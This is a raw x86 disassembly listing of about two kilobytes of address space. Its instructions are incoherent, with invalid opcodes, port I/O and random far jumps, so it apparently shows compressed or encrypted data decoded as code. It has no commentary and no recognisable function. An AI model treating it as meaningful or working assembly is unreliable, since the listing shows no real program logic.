  419dba:	and    BYTE PTR [edx-0x45],cl
  419dbd:	cmp    DWORD PTR [edx],eax
  419dbf:	imul   edx,DWORD PTR [ecx-0x25770a8b],0x75b06c2b
  419dc9:	ins    BYTE PTR es:[edi],dx
  419dca:	jno    0x419de3
  419dcc:	jbe    0x419e44
  419dce:	shl    ebp,0x11
  419dd1:	or     dh,ah
  419dd3:	mov    ecx,DWORD PTR [ecx+0x52]
  419dd6:	das    
  419dd7:	jl     0x419d97
  419dd9:	repz lock inc ecx
  419ddc:	stos   BYTE PTR es:[edi],al
  419ddd:	shl    al,0xc1
  419de0:	dec    esp
  419de1:	dec    edi
  419de2:	dec    ebx
  419de3:	mov    bl,0xad
  419de5:	mov    edx,0xfc4c75e2
  419dea:	fistp  WORD PTR [ebx-0x1745434b]
  419df0:	test   eax,0xfa77c7fc
  419df5:	mov    ch,0x7d
  419df7:	add    eax,0x4feab7cd
  419dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dfd:	leave  
  419dfe:	test   al,0x45
  419e00:	jb     0x419e3f
  419e02:	or     eax,0xcfd7cdaf
  419e07:	dec    esi
  419e08:	adc    DWORD PTR [ecx-0x12],edx
  419e0b:	xor    eax,0x888aa8ff
  419e10:	push   ss
  419e11:	enter  0xd377,0x82
  419e15:	ins    DWORD PTR es:[edi],dx
  419e16:	cwde   
  419e17:	add    dl,bl
  419e19:	xor    DWORD PTR ds:0x5a39d66a,esp
  419e1f:	sbb    al,0x8a
  419e21:	dec    esi
  419e22:	loop   0x419dd8
  419e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e25:	popa   
  419e26:	ins    DWORD PTR es:[edi],dx
  419e27:	mov    ebp,0x4fcbe498
  419e2c:	aad    0xc8
  419e2e:	scas   al,BYTE PTR es:[edi]
  419e2f:	fidivr WORD PTR [ebx+0x24]
  419e32:	call   FWORD PTR [ebp-0x62b31d22]
  419e38:	jae    0x419dda
  419e3a:	and    DWORD PTR [eax-0x1],eax
  419e3d:	sbb    DWORD PTR [eax],0x40
  419e40:	mov    al,BYTE PTR [edi-0x5255de70]
  419e46:	stos   DWORD PTR es:[edi],eax
  419e47:	popa   
  419e48:	cmp    BYTE PTR [ebp+0x72],0x2a
  419e4c:	inc    esi
  419e4d:	ds out 0xb0,eax
  419e50:	sub    BYTE PTR [edx],al
  419e52:	fpatan 
  419e54:	sub    al,0xf7
  419e56:	mov    BYTE PTR [eax-0x11],cl
  419e59:	pop    es
  419e5a:	xlat   BYTE PTR ds:[ebx]
  419e5b:	push   ss
  419e5c:	loope  0x419ebe
  419e5e:	sub    eax,0x89d53160
  419e63:	aam    0x6c
  419e65:	lea    ecx,[ebx+0x35ca1438]
  419e6b:	dec    ebx
  419e6c:	xchg   edi,eax
  419e6d:	ins    BYTE PTR es:[edi],dx
  419e6e:	push   ebp
  419e6f:	sub    BYTE PTR [esi+0x56],0x79
  419e73:	xchg   esi,eax
  419e74:	mov    ds:0x6f942676,eax
  419e79:	dec    esp
  419e7a:	mov    esi,0x654c48bd
  419e7f:	push   edx
  419e80:	mov    WORD PTR [edx+eax*1-0x29],ds
  419e84:	mov    ah,0x9a
  419e86:	jo     0x419e55
  419e88:	push   edx
  419e89:	loop   0x419ea1
  419e8b:	out    dx,eax
  419e8c:	add    esi,DWORD PTR [ebp+0x8]
  419e8f:	jmp    0x419ef7
  419e91:	shl    BYTE PTR [ecx-0x74],1
  419e94:	or     eax,0x964049a2
  419e99:	xchg   al,ah
  419e9b:	sub    dl,0xe9
  419e9e:	xor    esi,DWORD PTR [esi+eiz*8+0x5f]
  419ea2:	jl     0x419ee7
  419ea4:	adc    eax,DWORD PTR [edx-0x521c5263]
  419eaa:	ja     0x419f10
  419eac:	lods   eax,DWORD PTR ds:[esi]
  419ead:	retf   
  419eae:	inc    esp
  419eaf:	mov    bl,0xbe
  419eb1:	inc    ebx
  419eb2:	sub    ecx,DWORD PTR [ebx]
  419eb4:	dec    edx
  419eb5:	ins    BYTE PTR es:[di],dx
  419eb7:	mov    ch,0xfc
  419eb9:	jecxz  0x419ede
  419ebb:	push   ds
  419ebc:	xchg   ebx,eax
  419ebd:	sbb    esp,DWORD PTR [eax+0x45]
  419ec0:	pop    edi
  419ec1:	loop   0x419e4b
  419ec3:	cld    
  419ec4:	push   ds
  419ec5:	pop    edx
  419ec6:	inc    edi
  419ec7:	adc    eax,0x9942ada
  419ecc:	add    cl,ah
  419ece:	xor    eax,0x3c02aa93
  419ed3:	dec    edi
  419ed4:	lahf   
  419ed5:	(bad)  
  419ed6:	out    dx,al
  419ed7:	ret    0x184a
  419eda:	test   BYTE PTR [edi+0x5babb2f3],0xeb
  419ee1:	mov    ss,WORD PTR [edx]
  419ee3:	lods   al,BYTE PTR ds:[esi]
  419ee4:	test   al,0xb8
  419ee6:	rol    BYTE PTR [edx-0x32],cl
  419ee9:	retf   0xa467
  419eec:	dec    ecx
  419eed:	cdq    
  419eee:	push   ecx
  419eef:	dec    edi
  419ef0:	iret   
  419ef1:	lods   eax,DWORD PTR ds:[esi]
  419ef2:	push   0xffffffd3
  419ef4:	repz js 0x419eae
  419ef7:	and    ch,BYTE PTR [edi+0x7acd3fad]
  419efd:	xchg   edi,eax
  419efe:	retf   0x35c0
  419f01:	or     dl,al
  419f03:	jg     0x419f6d
  419f05:	pop    edx
  419f06:	test   BYTE PTR [esi],ah
  419f08:	rol    al,0xf9
  419f0b:	add    eax,0xb9285d0a
  419f10:	rcr    DWORD PTR [ecx+0x4ecc6fa],0xe1
  419f17:	sub    al,0x8
  419f19:	add    DWORD PTR [edi+0xb],ecx
  419f1c:	cmp    bh,BYTE PTR [edx-0x7526be11]
  419f22:	push   edi
  419f23:	sbb    BYTE PTR [eax-0x16],ch
  419f26:	sbb    ch,BYTE PTR [eax-0x263c597f]
  419f2c:	jae    0x419f55
  419f2e:	scas   eax,DWORD PTR es:[edi]
  419f2f:	mov    eax,ds:0xf1f30b81
  419f34:	repz jle 0x419f54
  419f37:	fistp  DWORD PTR [eax]
  419f39:	push   es
  419f3a:	xchg   esi,eax
  419f3b:	nop
  419f3c:	int3   
  419f3d:	sub    edi,edi
  419f3f:	mov    dl,0xef
  419f41:	leave  
  419f42:	not    BYTE PTR [edi-0x43]
  419f45:	sbb    al,0xd
  419f47:	call   0x9d9788d4
  419f4c:	xor    esp,esp
  419f4e:	mov    edx,DWORD PTR [edi]
  419f50:	and    esp,edi
  419f52:	xlat   BYTE PTR ds:[ebx]
  419f53:	pop    edx
  419f54:	mov    bl,0x54
  419f56:	aas    
  419f57:	inc    esp
  419f58:	jmp    0x89f68b96
  419f5d:	inc    edi
  419f5e:	cmp    eax,0xeb6a13e7
  419f63:	push   ss
  419f64:	std    
  419f65:	push   ecx
  419f66:	mov    bh,0x64
  419f68:	dec    ebp
  419f69:	repnz cdq 
  419f6b:	mov    ds:0x67b90c80,eax
  419f70:	cmp    BYTE PTR [esi+0x30],0xe
  419f74:	and    eax,0xdbb3e3dd
  419f79:	and    BYTE PTR [ebp+0x5f],0x73
  419f7d:	sbb    al,0x7e
  419f7f:	mov    eax,ds:0x73a92a4f
  419f84:	xchg   DWORD PTR [edi+0x49ea263b],ebp
  419f8a:	nop
  419f8b:	lods   al,BYTE PTR ds:[esi]
  419f8c:	mov    ah,0xdb
  419f8e:	sub    eax,0x8a32f089
  419f93:	jns    0x419f91
  419f95:	lods   al,BYTE PTR ds:[esi]
  419f96:	lds    esp,FWORD PTR [ebx]
  419f98:	xor    eax,0x2286a9f7
  419f9d:	sbb    BYTE PTR [ebx+0x5193d2e],ch
  419fa3:	ss dec esp
  419fa5:	mov    esp,gs
  419fa7:	out    dx,al
  419fa8:	imul   esi
  419faa:	scas   al,BYTE PTR es:[edi]
  419fab:	repnz test eax,0xec7dcd95
  419fb1:	cmc    
  419fb2:	outs   dx,BYTE PTR ds:[esi]
  419fb3:	dec    esi
  419fb4:	mov    DWORD PTR [esi],edi
  419fb6:	jmp    0x419fd6
  419fb8:	fidiv  DWORD PTR [ebx-0x7]
  419fbb:	and    al,0x26
  419fbd:	jb     0x419fdc
  419fbf:	jl     0x419ffa
  419fc1:	jbe    0x419f50
  419fc3:	bound  esi,QWORD PTR [ecx]
  419fc5:	sub    dh,dh
  419fc7:	jbe    0x419f64
  419fc9:	or     ebp,eax
  419fcb:	addr16 pop esi
  419fcd:	mov    ds:0x580c075d,eax
  419fd2:	out    0xe5,eax
  419fd4:	push   eax
  419fd5:	std    
  419fd6:	daa    
  419fd7:	cmp    eax,0xecbe2c0f
  419fdc:	aas    
  419fdd:	pop    es
  419fde:	pop    edi
  419fdf:	sub    BYTE PTR ss:[ecx-0x2e],ch
  419fe3:	lock mov dh,BYTE PTR [edx-0x15]
  419fe7:	mov    DWORD PTR [eax+0x71],esi
  419fea:	add    bh,al
  419fec:	jl     0x41a027
  419fee:	(bad)  
  419fef:	cmc    
  419ff0:	mov    ds:0xa02a4667,eax
  419ff5:	sub    dh,dh
  419ff7:	jne    0x41a062
  419ff9:	sub    DWORD PTR [ebx],0xffffffc7
  419ffc:	jb     0x41a052
  419ffe:	ins    BYTE PTR es:[edi],dx
  419fff:	dec    esp
  41a000:	or     ah,BYTE PTR [edi-0x43]
  41a003:	(bad)  
  41a004:	(bad)
  41a009:	pop    esp
  41a00a:	imul   edx,edi,0x665ae4b2
  41a010:	mov    esp,ds
  41a012:	inc    edx
  41a013:	mov    es,WORD PTR [edi+0x26]
  41a016:	mov    dl,0xac
  41a018:	push   cs
  41a019:	lea    eax,[esi+eax*2]
  41a01c:	or     esp,esp
  41a01e:	dec    edi
  41a01f:	push   es
  41a020:	ret    
  41a021:	push   esi
  41a022:	mov    ds:0x86b598cc,al
  41a027:	bound  ebx,QWORD PTR [ebp+0x2a]
  41a02a:	inc    eax
  41a02b:	add    bh,0xd0
  41a02e:	pop    ss
  41a02f:	idiv   DWORD PTR [eax]
  41a031:	sub    edi,ebp
  41a033:	push   esi
  41a034:	pushf  
  41a035:	jg     0x41a078
  41a037:	dec    ebp
  41a038:	sbb    al,0xa4
  41a03a:	push   ss
  41a03b:	hlt    
  41a03c:	cmp    ecx,DWORD PTR [edi+0x56ceca07]
  41a042:	pop    ecx
  41a043:	dec    edx
  41a044:	pop    ds
  41a045:	addr16 jge 0x41a064
  41a048:	shr    DWORD PTR [edx+ecx*4+0x2151ffb8],cl
  41a04f:	imul   esp,DWORD PTR [ebx-0x33a35188],0x76506a5f
  41a059:	cdq    
  41a05a:	push   ecx
  41a05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a05d:	or     BYTE PTR [edx+ebx*8],ah
  41a060:	jo     0x419ff6
  41a062:	ret    
  41a063:	sti    
  41a064:	sub    al,0x5d
  41a066:	cld    
  41a067:	inc    edi
  41a068:	clc    
  41a069:	loopne 0x41a076
  41a06b:	das    
  41a06c:	(bad)  
  41a06d:	pop    ebp
  41a06e:	or     BYTE PTR [eax],dh
  41a070:	pop    esi
  41a071:	dec    ecx
  41a072:	and    eax,0x94e9a692
  41a077:	jl     0x41a092
  41a079:	xchg   edx,eax
  41a07a:	fldcw  WORD PTR [eax+0x1a077cbf]
  41a080:	sbb    DWORD PTR [edi-0x2f],0x988de953
  41a087:	repz mov WORD PTR [ecx+0x26],ss
  41a08b:	ret    0xf370
  41a08e:	cmp    dh,BYTE PTR [esi-0x4f]
  41a091:	repz (bad) 
  41a093:	fstp   DWORD PTR [ecx]
  41a095:	leave  
  41a096:	scas   eax,DWORD PTR es:[edi]
  41a097:	mov    eax,0xd5fba24
  41a09c:	push   0x49e27208
  41a0a1:	xor    DWORD PTR [edi+0x7b5661f5],ecx
  41a0a7:	push   ecx
  41a0a8:	sar    DWORD PTR [ecx],1
  41a0aa:	jmp    0x7756:0x6b8b3910
  41a0b1:	loop   0x41a0d7
  41a0b3:	(bad)  
  41a0b4:	aad    0x9f
  41a0b6:	lock ins DWORD PTR es:[edi],dx
  41a0b8:	sub    eax,0xa68d19
  41a0bd:	imul   esi,DWORD PTR [ebx-0x166f5f57],0xf7278987
  41a0c7:	jge    0x41a0b9
  41a0c9:	push   edi
  41a0ca:	lods   al,BYTE PTR ds:[esi]
  41a0cb:	out    dx,al
  41a0cc:	sub    eax,0x189c190c
  41a0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0d2:	xchg   edi,eax
  41a0d3:	pushf  
  41a0d4:	sub    ch,bh
  41a0d6:	inc    eax
  41a0d7:	out    dx,al
  41a0d8:	ret    
  41a0d9:	adc    al,0x57
  41a0db:	inc    ebx
  41a0dc:	pushf  
  41a0dd:	sub    ebp,DWORD PTR [ebx]
  41a0df:	cmp    cl,BYTE PTR [esi-0x1ce7adfa]
  41a0e5:	and    cl,BYTE PTR [esi]
  41a0e7:	cmp    al,0x7a
  41a0e9:	push   0xffffffc7
  41a0eb:	dec    ebp
  41a0ec:	inc    esi
  41a0ed:	imul   esi,ebx,0x91e252bd
  41a0f3:	(bad)  
  41a0f4:	(bad)  
  41a0f5:	lods   eax,DWORD PTR ds:[esi]
  41a0f6:	pop    ss
  41a0f7:	inc    edi
  41a0f8:	inc    BYTE PTR [esi]
  41a0fa:	shr    BYTE PTR [esp+ecx*1-0x1177c8d6],0x3b
  41a102:	retf   0xfe5b
  41a105:	inc    esi
  41a106:	dec    esi
  41a107:	sbb    DWORD PTR [ebp-0x5c2e11e8],ebx
  41a10d:	inc    esi
  41a10e:	or     edi,0x4c
  41a111:	add    BYTE PTR [esi+0x631c8293],bl
  41a117:	loopne 0x41a171
  41a119:	inc    edx
  41a11a:	(bad)  
  41a11b:	adc    BYTE PTR cs:[esi-0x12158d9c],ah
  41a122:	sub    al,0x95
  41a124:	pusha  
  41a125:	lahf   
  41a126:	xor    eax,0xea3219a0
  41a12b:	dec    ebx
  41a12c:	push   esp
  41a12d:	jmp    0x2986:0x489b94bc
  41a134:	lea    edx,[eax]
  41a136:	mov    bh,0x30
  41a138:	xchg   ebp,eax
  41a139:	out    0xe,al
  41a13b:	cmp    edx,DWORD PTR [esi+0x6d87da28]
  41a141:	mov    ah,0xa9
  41a143:	test   DWORD PTR [ebx+0x5f],esp
  41a146:	int    0x70
  41a148:	scas   al,BYTE PTR es:[edi]
  41a149:	adc    eax,0x6eeb3dbd
  41a14e:	test   ecx,edi
  41a150:	cdq    
  41a151:	rcl    ch,cl
  41a153:	inc    esp
  41a154:	xlat   BYTE PTR ds:[ebx]
  41a155:	arpl   WORD PTR [ebp+0x53],dx
  41a158:	test   BYTE PTR [edi],0xd9
  41a15b:	mov    ch,BYTE PTR [ebx-0x27]
  41a15e:	hlt    
  41a15f:	scas   eax,DWORD PTR es:[edi]
  41a160:	fsub   QWORD PTR [ecx]
  41a162:	lock ja 0x41a11c
  41a165:	das    
  41a166:	in     al,dx
  41a167:	pop    ebp
  41a168:	push   esi
  41a169:	inc    edi
  41a16a:	inc    ecx
  41a16b:	js     0x41a1c3
  41a16d:	adc    eax,0x7783419f
  41a172:	lahf   
  41a173:	mov    dh,0x3e
  41a175:	pop    esi
  41a176:	sbb    eax,DWORD PTR [esi-0x4013c194]
  41a17c:	dec    esi
  41a17d:	jne    0x41a108
  41a17f:	repz pop esi
  41a181:	sbb    DWORD PTR [eax-0x9],esi
  41a184:	(bad)  
  41a185:	je     0x41a168
  41a187:	stc    
  41a188:	sub    BYTE PTR [ecx-0xeb18182],bl
  41a18e:	sub    BYTE PTR [ecx-0x49],ah
  41a191:	out    dx,al
  41a192:	jge    0x41a1ae
  41a194:	shl    BYTE PTR [ecx-0x190aede7],cl
  41a19a:	test   ebp,esi
  41a19c:	sahf   
  41a19d:	xchg   esi,eax
  41a19e:	jg     0x41a17c
  41a1a0:	jg     0x41a1ca
  41a1a2:	scas   al,BYTE PTR es:[edi]
  41a1a3:	adc    DWORD PTR ds:0x117c1ff0,ebp
  41a1a9:	imul   esi,DWORD PTR [eax+0x38],0xffffffb3
  41a1ad:	into   
  41a1ae:	mov    WORD PTR [ebp+ecx*1-0x61],cs
  41a1b2:	mov    ds:0x3041ab3c,al
  41a1b7:	mov    bh,0x4b
  41a1b9:	push   ecx
  41a1ba:	lock js 0x41a192
  41a1bd:	adc    DWORD PTR [ebp-0x84aa386],esi
  41a1c3:	inc    ecx
  41a1c4:	dec    ecx
  41a1c5:	dec    ecx
  41a1c6:	mov    es,WORD PTR [edi]
  41a1c8:	sbb    ecx,DWORD PTR [ecx]
  41a1ca:	cmp    ch,BYTE PTR [edx+0x31e5da01]
  41a1d0:	(bad)  
  41a1d1:	enter  0x3ab2,0x5b
  41a1d5:	call   0xbb5d:0x70d6ff63
  41a1dc:	stos   DWORD PTR es:[edi],eax
  41a1dd:	(bad)  
  41a1de:	retf   
  41a1df:	adc    esi,ecx
  41a1e1:	imul   ecx,DWORD PTR [edi],0x24
  41a1e4:	scas   al,BYTE PTR es:[edi]
  41a1e5:	repnz push edi
  41a1e7:	(bad)  
  41a1e8:	adc    ah,BYTE PTR [ebx+0x1fba91ed]
  41a1ee:	dec    ebp
  41a1ef:	test   al,0x36
  41a1f1:	dec    esi
  41a1f2:	mov    ch,0x4b
  41a1f4:	in     eax,0x46
  41a1f6:	adc    BYTE PTR [eax],bl
  41a1f8:	call   0xb7839c5c
  41a1fd:	sub    BYTE PTR [eax-0x530e5e0a],dh
  41a203:	shl    DWORD PTR [ebp*1-0x30147da7],0xcc
  41a20b:	icebp  
  41a20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a20d:	or     ebx,esi
  41a20f:	mov    eax,ds:0x61cba8c6
  41a214:	cmp    edx,DWORD PTR [ecx-0x45]
  41a217:	jno    0x41a1a5
  41a219:	fist   WORD PTR [eax-0x5fbe48f7]
  41a21f:	xchg   ecx,eax
  41a220:	jno    0x41a24c
  41a222:	inc    esi
  41a223:	mov    eax,ds:0xbc2f3dfe
  41a228:	retf   0xaa91
  41a22b:	fild   DWORD PTR [esi+0x2a]
  41a22e:	push   esp
  41a22f:	or     eax,0x99068184
  41a234:	call   0x8f68595a
  41a239:	or     al,0x1a
  41a23b:	sbb    eax,0x3cba7286
  41a240:	test   esp,0x2aa33c28
  41a246:	stc    
  41a247:	push   esi
  41a248:	adc    al,0x14
  41a24a:	cmp    cl,0xd1
  41a24d:	push   cs
  41a24e:	gs dec ebx
  41a250:	scas   al,BYTE PTR es:[edi]
  41a251:	pop    ebx
  41a252:	add    ebp,DWORD PTR [ebx-0x77]
  41a255:	sbb    eax,0xb2cbcfda
  41a25a:	lds    ebx,FWORD PTR [ebx-0x408d4f06]
  41a260:	mov    esi,0x7d5568f5
  41a265:	sub    al,0x45
  41a267:	in     al,0xe
  41a269:	popa   
  41a26a:	or     ecx,DWORD PTR [esp+0x39ccd5ae]
  41a271:	push   0x26
  41a273:	stos   BYTE PTR es:[edi],al
  41a274:	fdiv   DWORD PTR [esi]
  41a276:	scas   al,BYTE PTR es:[edi]
  41a277:	aam    0xba
  41a279:	clc    
  41a27a:	adc    edx,DWORD PTR [esi-0x30]
  41a27d:	and    ebp,esp
  41a27f:	pop    ecx
  41a280:	sbb    ecx,DWORD PTR [esi+ebp*2]
  41a283:	sub    ch,BYTE PTR [esi+eiz*2]
  41a286:	or     eax,DWORD PTR [edx+0x2]
  41a289:	dec    esi
  41a28a:	jmp    0xfa8e:0x85b71e46
  41a291:	inc    ecx
  41a292:	cld    
  41a293:	push   ebp
  41a294:	mov    ebx,0xe4c0b7c9
  41a299:	lea    esp,[ebp+0x46]
  41a29c:	mov    ah,0xd4
  41a29e:	sbb    al,0xb6
  41a2a0:	adc    cl,BYTE PTR ds:0xfe2f0486
  41a2a6:	or     DWORD PTR [eax+0xc1c9fd1],esp
  41a2ac:	pushf  
  41a2ad:	dec    edx
  41a2ae:	in     al,dx
  41a2af:	add    al,0x86
  41a2b1:	and    eax,0x2121407c
  41a2b6:	jns    0x41a2f2
  41a2b8:	sub    BYTE PTR [edx+edx*1-0x37],cl
  41a2bc:	xor    DWORD PTR [ebx],edi
  41a2be:	loop   0x41a289
  41a2c0:	mov    eax,0x3eb5683b
  41a2c5:	sbb    BYTE PTR [ecx+0x56],cl
  41a2c8:	push   ebx
  41a2c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ca:	dec    esp
  41a2cb:	add    eax,0x40a08362
  41a2d0:	xchg   esp,eax
  41a2d1:	daa    
  41a2d2:	pop    ebx
  41a2d3:	mov    cl,0x81
  41a2d5:	out    0x88,eax
  41a2d7:	adc    ebp,esp
  41a2d9:	sti    
  41a2da:	vpackusdw ymm1,ymm2,ymm0
  41a2df:	fucom  st(6)
  41a2e1:	cwde   
  41a2e2:	push   ss
  41a2e3:	in     al,dx
  41a2e4:	sti    
  41a2e5:	jae    0x41a30d
  41a2e7:	dec    ecx
  41a2e8:	mov    ecx,0x43a317a3
  41a2ed:	jge    0x41a318
  41a2ef:	scas   al,BYTE PTR es:[edi]
  41a2f0:	lea    ebx,[edx]
  41a2f2:	int3   
  41a2f3:	clc    
  41a2f4:	imul   ebx,DWORD PTR [esi-0x34],0xc6d64c88
  41a2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2fc:	loop   0x41a2ce
  41a2fe:	mov    bh,0xf
  41a300:	sub    BYTE PTR [esi+edi*2-0x29],bl
  41a304:	ror    BYTE PTR [ebx-0x5f],0x95
  41a308:	(bad)  
  41a309:	dec    ebp
  41a30a:	push   cs
  41a30b:	cmc    
  41a30c:	push   es
  41a30d:	push   ecx
  41a30e:	inc    ebp
  41a30f:	mov    al,0x56
  41a311:	bound  ecx,QWORD PTR ds:0xa331e785
  41a317:	call   0xbc3f:0xdd5f56ec
  41a31e:	lods   al,BYTE PTR ds:[esi]
  41a31f:	add    DWORD PTR [edi],esi
  41a321:	mov    ch,0xb0
  41a323:	outs   dx,DWORD PTR ds:[esi]
  41a324:	xchg   ebx,eax
  41a325:	adc    al,0x45
  41a327:	bound  ebp,QWORD PTR [ecx-0x57]
  41a32a:	repz mov cl,0x2
  41a32d:	jle    0x41a398
  41a32f:	lods   al,BYTE PTR ds:[esi]
  41a330:	jmp    0xb03d:0x7b49b19a
  41a337:	loope  0x41a2ca
  41a339:	in     eax,dx
  41a33a:	out    0x6e,al
  41a33c:	or     eax,0x5c0fc6d3
  41a341:	mov    al,ds:0x8ba52e41
  41a346:	or     al,bh
  41a348:	jno    0x41a35e
  41a34a:	mov    esp,0xcfed8942
  41a34f:	lock jnp 0x41a36b
  41a352:	xor    esp,DWORD PTR [eax]
  41a354:	dec    eax
  41a355:	and    ebx,DWORD PTR [esi-0x54]
  41a358:	jnp    0x41a2f5
  41a35a:	aas    
  41a35b:	jmp    WORD PTR [ebx+ecx*1+0x21]
  41a360:	mov    eax,0x86b4d25c
  41a365:	outs   dx,BYTE PTR ds:[esi]
  41a366:	and    DWORD PTR [edx+0x19],eax
  41a369:	outs   dx,BYTE PTR ds:[esi]
  41a36a:	jge    0x41a3b5
  41a36c:	pusha  
  41a36d:	mov    ds:0x3c3f2713,eax
  41a372:	mov    dl,0xe6
  41a374:	sub    esp,DWORD PTR [esi-0x6412e08b]
  41a37a:	mov    ds:0x28cfda28,eax
  41a37f:	mov    ebp,DWORD PTR [edi+0x2d1e4e4c]
  41a385:	mov    cs,eax
  41a387:	push   esp
  41a388:	rol    BYTE PTR ds:0x449b4324,1
  41a38e:	jne    0x41a354
  41a390:	icebp  
  41a391:	pop    es
  41a392:	xchg   edi,eax
  41a393:	sub    eax,0x1b86f6d3
  41a398:	pop    ecx
  41a399:	jl     0x41a3f3
  41a39b:	test   BYTE PTR [esi-0x2],bl
  41a39e:	and    DWORD PTR [esi-0x48603fdf],eax
  41a3a4:	nop
  41a3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3a6:	stos   DWORD PTR es:[edi],eax
  41a3a7:	xor    eax,0x6e6223a9
  41a3ac:	loopne 0x41a42c
  41a3ae:	aad    0xbd
  41a3b0:	cmc    
  41a3b1:	mov    ah,0xad
  41a3b3:	in     eax,0xf0
  41a3b5:	inc    ecx
  41a3b6:	mov    eax,0xac03c155
  41a3bb:	repz and BYTE PTR [edi-0x2],bh
  41a3bf:	test   DWORD PTR [ebx],0x6a63120e
  41a3c5:	fdiv   DWORD PTR [eax]
  41a3c7:	fst    DWORD PTR [eax+0x7dbfc007]
  41a3cd:	(bad)  
  41a3d1:	in     al,dx
  41a3d2:	lahf   
  41a3d3:	mov    cs,WORD PTR [ebx-0x1d7d45dc]
  41a3d9:	pop    ecx
  41a3da:	aad    0x29
  41a3dc:	add    BYTE PTR [eax+0x64],cl
  41a3df:	inc    edx
  41a3e0:	or     cl,BYTE PTR [edi]
  41a3e2:	popf   
  41a3e3:	xor    esi,DWORD PTR [eax+0x33]
  41a3e6:	jno    0x41a42d
  41a3e8:	cmp    BYTE PTR [edx+ebp*1-0x20b505a9],0x5e
  41a3f0:	sub    BYTE PTR [esi-0x28],ah
  41a3f3:	jg     0x41a43c
  41a3f5:	inc    ebp
  41a3f6:	fdiv   QWORD PTR [esi+edi*8]
  41a3f9:	ret    0x9199
  41a3fc:	loopne 0x41a40a
  41a3fe:	sti    
  41a3ff:	fild   QWORD PTR [ebx]
  41a401:	(bad)  
  41a402:	pushf  
  41a403:	add    al,BYTE PTR [esi]
  41a405:	pop    es
  41a406:	or     DWORD PTR [ebx+esi*1+0x4f],eax
  41a40a:	inc    esp
  41a40b:	bound  ecx,QWORD PTR [ebp-0x31]
  41a40e:	adc    al,0x5
  41a410:	popa   
  41a411:	repnz push eax
  41a413:	jmp    0xb226bb0a
  41a418:	test   al,0x7b
  41a41a:	add    bl,BYTE PTR [esi]
  41a41c:	in     al,0x88
  41a41e:	or     dl,BYTE PTR [ebx]
  41a420:	push   esp
  41a421:	sahf   
  41a422:	jmp    0x394cb5ed
  41a427:	jmp    0xbbedd1df
  41a42c:	xchg   ecx,eax
  41a42d:	aad    0xe5
  41a42f:	sahf   
  41a430:	fmul   DWORD PTR [esp+eiz*4+0x3cc51e9c]
  41a437:	pusha  
  41a438:	shl    DWORD PTR [ebx+0x66a89a7f],0x4
  41a43f:	ss cmp eax,0xbc503486
  41a445:	push   ebp
  41a446:	dec    esi
  41a447:	pop    esi
  41a448:	dec    esp
  41a449:	int3   
  41a44a:	loopne 0x41a42c
  41a44c:	and    BYTE PTR [ebx-0x374843a5],bh
  41a452:	cmp    al,BYTE PTR [ebp-0x17]
  41a455:	xchg   DWORD PTR [edx],ecx
  41a457:	lods   eax,DWORD PTR ds:[esi]
  41a458:	mov    cl,0x5f
  41a45a:	adc    eax,0xceda9cd3
  41a45f:	das    
  41a460:	mov    eax,ds:0x8c0833a3
  41a465:	or     BYTE PTR [esi],ah
  41a467:	stos   DWORD PTR es:[edi],eax
  41a468:	push   ebx
  41a469:	xlat   BYTE PTR ds:[ebx]
  41a46a:	pop    esp
  41a46b:	and    al,0xca
  41a46d:	mov    cl,0x30
  41a46f:	aas    
  41a470:	jl     0x41a3fb
  41a472:	inc    edi
  41a473:	outs   dx,BYTE PTR ds:[esi]
  41a474:	mov    esi,DWORD PTR ds:0x89afb47c
  41a47a:	pop    esp
  41a47b:	or     DWORD PTR [edx+0x30],eax
  41a47e:	fmul   QWORD PTR [ecx+edi*1+0x55]
  41a482:	pop    edi
  41a483:	shr    DWORD PTR [ecx+0x20],cl
  41a486:	xlat   BYTE PTR ds:[ebx]
  41a487:	adc    edx,ecx
  41a489:	xor    BYTE PTR [edi-0x34],al
  41a48c:	(bad)  
  41a48d:	mov    dl,0x5a
  41a48f:	inc    esp
  41a490:	scas   al,BYTE PTR es:[edi]
  41a491:	sbb    al,bh
  41a493:	ins    DWORD PTR es:[edi],dx
  41a494:	mov    DWORD PTR [edx],edx
  41a496:	int    0xd2
  41a498:	ret    
  41a499:	fwait
  41a49a:	js     0x41a4cb
  41a49c:	push   edx
  41a49d:	xchg   ebp,eax
  41a49e:	sub    ebp,DWORD PTR [ecx+0x16]
  41a4a1:	je     0x41a447
  41a4a3:	loop   0x41a508
  41a4a5:	or     al,0xcd
  41a4a7:	mov    cl,BYTE PTR [ebx-0x1]
  41a4aa:	dec    BYTE PTR [ecx-0x1801ba9]
  41a4b0:	mov    edi,0x5bf402a3
  41a4b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4b6:	mov    ds:0xac2b9512,eax
  41a4bb:	add    BYTE PTR [esi+0x362fc458],0xc5
  41a4c2:	jmp    0xe4f5:0xdad134d7
  41a4c9:	rol    BYTE PTR [eax+0x2],1
  41a4cc:	push   0xffffffb1
  41a4ce:	test   al,0x4
  41a4d0:	pop    esi
  41a4d1:	xchg   edx,eax
  41a4d2:	xor    eax,0x4a6f66e4
  41a4d7:	pop    es
  41a4d8:	popa   
  41a4d9:	mov    dh,BYTE PTR [edx+0x3a0ca00d]
  41a4df:	jno    0x41a474
  41a4e1:	add    eax,0x82c205f5
  41a4e6:	pop    edi
  41a4e7:	ret    
  41a4e8:	jnp    0x41a4c5
  41a4ea:	jno    0x41a54e
  41a4ec:	int3   
  41a4ed:	push   eax
  41a4ee:	xchg   esp,eax
  41a4ef:	mov    al,ds:0xe3ebe39c
  41a4f4:	dec    ebp
  41a4f5:	xchg   esp,eax
  41a4f6:	leave  
  41a4f7:	into   
  41a4f8:	pop    esi
  41a4f9:	pop    esi
  41a4fa:	rcl    BYTE PTR [ebx-0x191eac80],cl
  41a500:	push   cs
  41a501:	jae    0x41a56c
  41a503:	push   es
  41a504:	adc    ebx,DWORD PTR [eax+eiz*8+0x515f215c]
  41a50b:	retw   
  41a50d:	jmp    0x2b8e91f
